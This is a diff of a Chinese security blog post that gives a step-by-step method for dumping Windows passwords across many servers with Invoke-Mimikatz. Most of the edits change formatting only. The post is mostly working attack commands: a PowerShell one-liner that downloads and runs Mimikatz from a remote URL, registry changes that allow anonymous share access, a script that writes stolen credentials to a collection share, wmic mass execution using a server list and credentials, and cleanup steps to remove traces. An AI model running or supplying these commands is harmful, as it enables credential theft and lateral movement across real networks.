@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="通常可以使用以下方式获取登陆windows的密码： powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;apos;http://dwz.cn/1OropX&amp;apos;); Invoke-Mimikatz -DumpCreds&amp;quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取nt">
+<meta name="description" content="通常可以使用以下方式获取登陆windows的密码：powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;apos;http://dwz.cn/1OropX&amp;apos;); Invoke-Mimikatz -DumpCreds&amp;quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntd">
 <meta property="og:type" content="article">
 <meta property="og:title" content="使用Invoke-Mimikatz.ps1批量获取windows密码">
 <meta property="og:url" content="http://MaiKeFee.com/archives/ed9d09ca.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="通常可以使用以下方式获取登陆windows的密码： powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;apos;http://dwz.cn/1OropX&amp;apos;); Invoke-Mimikatz -DumpCreds&amp;quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取nt">
+<meta property="og:description" content="通常可以使用以下方式获取登陆windows的密码：powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;apos;http://dwz.cn/1OropX&amp;apos;); Invoke-Mimikatz -DumpCreds&amp;quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntd">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-27T15:14:42.265Z">
+<meta property="og:updated_time" content="2019-08-28T08:45:43.317Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="使用Invoke-Mimikatz.ps1批量获取windows密码">
-<meta name="twitter:description" content="通常可以使用以下方式获取登陆windows的密码： powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;apos;http://dwz.cn/1OropX&amp;apos;); Invoke-Mimikatz -DumpCreds&amp;quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取nt">
+<meta name="twitter:description" content="通常可以使用以下方式获取登陆windows的密码：powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;apos;http://dwz.cn/1OropX&amp;apos;); Invoke-Mimikatz -DumpCreds&amp;quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntd">
 
 
 
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T23:14:42+08:00">
-                2019-08-27
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:45:43+08:00">
+                2019-08-28
               </time>
             
           </span>
@@ -402,7 +402,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  409
+                  411
                 </span>
               
 
@@ -439,26 +439,39 @@
       
 
       
-        <p>通常可以使用以下方式获取登陆windows的密码：</p>
-<pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://dwz.cn/1OropX&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre><p>通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntds.dit的hash以后还不一定能破解出来,所以可以通过Mimikatz来获取明文密码，但是一台一台登陆去获取会很慢且不方便，所以这里介绍一个批量的方法：</p>
+        <h4 id="通常可以使用以下方式获取登陆windows的密码："><a href="#通常可以使用以下方式获取登陆windows的密码：" class="headerlink" title="通常可以使用以下方式获取登陆windows的密码："></a>通常可以使用以下方式获取登陆windows的密码：</h4><pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://dwz.cn/1OropX&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre><p>通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntds.dit的hash以后还不一定能破解出来,所以可以通过Mimikatz来获取明文密码，但是一台一台登陆去获取会很慢且不方便，所以这里介绍一个批量的方法：</p>
+<blockquote>
 <p>1.创建共享文件夹：</p>
+</blockquote>
 <pre><code>cd\
 mkdir open
 net share open=C:\open /grant:everyone,full
-icacls C:\open\ /grant Everyone:(OI)(CI)F /t</code></pre><p>修改注册表</p>
+icacls C:\open\ /grant Everyone:(OI)(CI)F /t</code></pre><blockquote>
+<p>修改注册表</p>
+</blockquote>
 <pre><code>reg change HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ open
-reg change HKLM\System\CurrentControlSet\Control\Lsa &quot;EveryoneIncludesAnonymous&quot; 1</code></pre><p>修改共享目录到open。</p>
+reg change HKLM\System\CurrentControlSet\Control\Lsa &quot;EveryoneIncludesAnonymous&quot; 1</code></pre><blockquote>
+<p>修改共享目录到open。</p>
+</blockquote>
+<blockquote>
 <p>2.在共享目录添加下列文件：</p>
+</blockquote>
 <pre><code>1）执行脚本powershellme.cmd，脚本内容：
 powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.1.11:8080/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.11\open\%COMPUTERNAME%.txt 2&gt;&amp;1
 ip是设置共享的主机ip地址。
 2）Invoke-Mimikatz.ps1
 3）mongoose
 4）服务器列表serverlist.txt，换行分割。
-3.运行mongoose，默认开启端口8080</code></pre><p>4.执行wmic：</p>
+3.运行mongoose，默认开启端口8080</code></pre><blockquote>
+<p>4.执行wmic：</p>
+</blockquote>
 <pre><code>wmic /node:@serverlist.txt process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot;</code></pre><p>带凭证：</p>
-<pre><code>wmic /node:@serverlist.txt /user:PROJECTMENTOR\evi1cg /password:123 process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot;</code></pre><p>5.在共享目录看各个服务器的密码吧。</p>
+<pre><code>wmic /node:@serverlist.txt /user:PROJECTMENTOR\evi1cg /password:123 process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot;</code></pre><blockquote>
+<p>5.在共享目录看各个服务器的密码吧。</p>
+</blockquote>
+<blockquote>
 <p>6.清除记录：</p>
+</blockquote>
 <pre><code>1）关掉mongoose,并删除
 2）net share open /delete
 3）删除共享目录及文件
@@ -556,8 +569,17 @@ psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -626,6 +648,22 @@ psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#通常可以使用以下方式获取登陆windows的密码："><span class="nav-number">1.</span> <span class="nav-text">通常可以使用以下方式获取登陆windows的密码：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
